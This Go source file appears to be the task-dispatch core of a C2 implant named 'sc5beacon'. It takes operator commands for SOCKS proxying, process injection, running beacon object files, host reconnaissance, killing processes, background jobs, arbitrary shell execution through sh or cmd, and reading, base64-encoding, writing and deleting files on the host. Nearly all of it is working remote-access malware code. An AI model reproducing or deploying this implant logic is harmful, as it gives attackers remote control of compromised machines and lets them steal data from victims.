package main

import (
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
)

var jobs = newJobManager()

func runTask(cmd string, args map[string]any) string {
	cmd = strings.TrimSpace(cmd)
	if strings.HasPrefix(cmd, "file:") {
		return runFileOp(cmd, args)
	}
	if cmd == "socks:start" {
		return "socks:ready"
	}
	if cmd == "socks:connect" {
		return handleSocksConnect(args)
	}
	if cmd == "profile:switch" {
		if pid, ok := args["profile_id"].(string); ok {
			return "profile_switch_ack:" + pid
		}
		return "profile_switch_ack"
	}
	if strings.HasPrefix(cmd, "inject:") || cmd == "inject" {
		return handleInject(cmd, args)
	}
	if cmd == "bof:run" {
		return handleBofRun(args)
	}
	if cmd == "sysinfo" {
		return fmt.Sprintf(
			"os=%s arch=%s hostname=%s user=%s cwd=%s agent=sc5beacon ver=3.0.0",
			runtime.GOOS, runtime.GOARCH, hostName(), envUser(), jobs.getCwd(),
		)
	}
	if cmd == "pwd" {
		return jobs.getCwd()
	}
	if cmd == "cd" {
		path, _ := args["path"].(string)
		if path == "" {
			path, _ = args["dir"].(string)
		}
		if path == "" && len(args) == 0 {
			// allow "cd /tmp" as shell-style in command - handled below
		}
		return jobs.setCwd(path)
	}
	if strings.HasPrefix(cmd, "cd ") {
		return jobs.setCwd(strings.TrimSpace(cmd[3:]))
	}
	if cmd == "ps" || cmd == "processes" {
		return listProcesses()
	}
	if cmd == "kill" || strings.HasPrefix(cmd, "kill ") {
		pid := anyToInt(args["pid"])
		if pid == 0 && strings.HasPrefix(cmd, "kill ") {
			pid = anyToInt(strings.TrimSpace(cmd[5:]))
		}
		return killPID(pid)
	}
	if cmd == "job:list" || cmd == "jobs" {
		return jobs.list()
	}
	if cmd == "job:get" {
		id, _ := args["id"].(string)
		if id == "" {
			id, _ = args["job_id"].(string)
		}
		return jobs.get(id)
	}
	if cmd == "job:kill" {
		id, _ := args["id"].(string)
		if id == "" {
			id, _ = args["job_id"].(string)
		}
		return jobs.kill(id)
	}
	if cmd == "job:start" || cmd == "async" {
		c, _ := args["command"].(string)
		if c == "" {
			c, _ = args["cmd"].(string)
		}
		if c == "" {
			return "error: command required"
		}
		return jobs.start(c)
	}
	// args.async == true -> background job
	if asyncFlag(args) {
		return jobs.start(cmd)
	}
	// default: shell in job cwd
	var c *exec.Cmd
	if runtime.GOOS == "windows" {
		c = exec.Command("cmd", "/C", cmd)
	} else {
		c = exec.Command("sh", "-c", cmd)
	}
	c.Dir = jobs.getCwd()
	out, err := c.CombinedOutput()
	if err != nil {
		return string(out) + "\n" + err.Error()
	}
	return string(out)
}

func asyncFlag(args map[string]any) bool {
	if args == nil {
		return false
	}
	if v, ok := args["async"].(bool); ok && v {
		return true
	}
	if v, ok := args["async"].(string); ok && (v == "1" || strings.EqualFold(v, "true")) {
		return true
	}
	return false
}

func runFileOp(cmd string, args map[string]any) string {
	op := strings.TrimPrefix(cmd, "file:")
	path, _ := args["path"].(string)
	if path == "" && op != "list" {
		return "error: path required"
	}
	switch op {
	case "list":
		if path == "" {
			path = jobs.getCwd()
		}
		entries, err := os.ReadDir(path)
		if err != nil {
			return err.Error()
		}
		var b strings.Builder
		for _, e := range entries {
			info, _ := e.Info()
			mode := "f"
			if e.IsDir() {
				mode = "d"
			}
			sz := int64(0)
			if info != nil {
				sz = info.Size()
			}
			fmt.Fprintf(&b, "%s\t%d\t%s\n", mode, sz, e.Name())
		}
		return b.String()
	case "read":
		data, err := os.ReadFile(path)
		if err != nil {
			return err.Error()
		}
		off := 0
		if v, ok := args["offset"].(float64); ok {
			off = int(v)
		}
		if off > len(data) {
			off = len(data)
		}
		data = data[off:]
		if v, ok := args["length"].(float64); ok {
			n := int(v)
			if n >= 0 && n < len(data) {
				data = data[:n]
			}
		}
		if _, ok := args["as_b64"]; ok {
			return base64.StdEncoding.EncodeToString(data)
		}
		return string(data)
	case "write":
		var data []byte
		if s, ok := args["content_b64"].(string); ok && s != "" {
			var err error
			data, err = base64.StdEncoding.DecodeString(s)
			if err != nil {
				return err.Error()
			}
		} else if s, ok := args["content"].(string); ok {
			data = []byte(s)
		} else {
			return "error: content required"
		}
		if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil && filepath.Dir(path) != "." {
			// ignore
		}
		if err := os.WriteFile(path, data, 0o600); err != nil {
			return err.Error()
		}
		return "ok"
	case "delete":
		if err := os.Remove(path); err != nil {
			return err.Error()
		}
		return "ok"
	default:
		return "error: unknown file op"
	}
}

func hostName() string {
	h, _ := os.Hostname()
	return h
}

func envUser() string {
	u := os.Getenv("USER")
	if u == "" {
		u = os.Getenv("USERNAME")
	}
	return u
}

func getenv(k string) string { return os.Getenv(k) }
